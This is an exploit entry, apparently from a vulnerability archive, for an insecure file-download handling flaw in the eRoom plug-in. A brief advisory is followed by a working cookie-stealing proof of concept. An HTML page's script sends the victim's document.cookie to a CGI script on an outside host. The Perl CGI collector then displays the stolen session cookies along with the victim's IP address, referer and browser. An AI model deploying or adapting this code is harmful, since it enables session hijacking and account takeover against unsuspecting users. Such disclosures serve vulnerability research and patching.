source: http://www.securityfocus.com/bid/14176/info

The eRoom plug-in is prone to an insecure file download handling vulnerability.

The issue is due to a design fault, where files that are shared by users are apparently passed to default file handlers when downloaded. This can occur without user knowledge, and can be a security risk for certain file types on certain platforms. 

 /* cookie.html */
  <html>
  <head>
    <title>Raiding the cookie jar</title>
  </head>
  <body>

  <br>
    <script>document.location='https://10.1.1.2/cgi-bin/cookie.cgi?' +document.cookie</script>
  <br>

  </body>
  </html>


  /* cookie.cgi */
  #!/usr/bin/perl
  use CGI qw(:standard);
  use CGI::Carp qw(warningsToBrowser fatalsToBrowser);
  use strict;

  my $break = "<br>";
  my $browser = $ENV{'HTTP_USER_AGENT'};
  my $cookie = $ENV{'QUERY_STRING'};
  my $remote = $ENV{'REMOTE_ADDR'};
  my $referer = $ENV{'HTTP_REFERER'};
  my $reqmeth = $ENV{'REQUEST_METHOD'};

  print header;

  print "<html>",
        "<head><title>Cookie Jacker</title></head>",
        "<center><h1>Yummy!</h1>",
        "ASPSESSIONID & SMSESSIONID could be useful for something? ;)",
        "$break$break$break$break",
        "<img src=\"/cookiemonster.jpg\">",
        "</center>",
        "$break$break$break$break\n";

  $cookie =~ s/;%20/$break/g;

  if($browser =~ /MSIE/) {
                print "Come on, is this the 90s or smtng!$break";
        } else {
                print "j00 are l33t$break";
  }

  print "Client connection came from $remote$break",
        "Refered by $referer$break",
        "Using $reqmeth$break$break",
        "$cookie\n";

  print end_html;

